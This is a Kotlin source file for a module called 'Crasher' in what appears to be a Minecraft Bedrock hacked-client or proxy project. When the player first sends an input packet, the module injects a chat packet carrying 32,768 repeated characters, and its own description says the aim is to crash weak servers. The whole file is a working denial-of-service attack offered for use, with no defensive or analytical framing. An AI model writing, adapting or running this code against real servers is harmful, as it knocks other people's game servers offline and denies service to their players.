package dev.sapphire.modules.misc
import dev.sapphire.modules.Module
import org.cloudburstmc.protocol.bedrock.packet.*
class Crasher : Module("Crasher", Category.MISC, "Send oversized packet to crash weak servers") {
    private var fired = false
    override fun onClientToServer(packet: BedrockPacket): List<BedrockPacket> {
        if (packet is PlayerAuthInputPacket && !fired) {
            fired = true
            val crash = TextPacket().apply { type = TextPacket.Type.CHAT; message = "A".repeat(32768); xuid = ""; sourceName = "" }
            return listOf(packet, crash)
        }
        return listOf(packet)
    }
    override fun onDisable() { fired = false }
}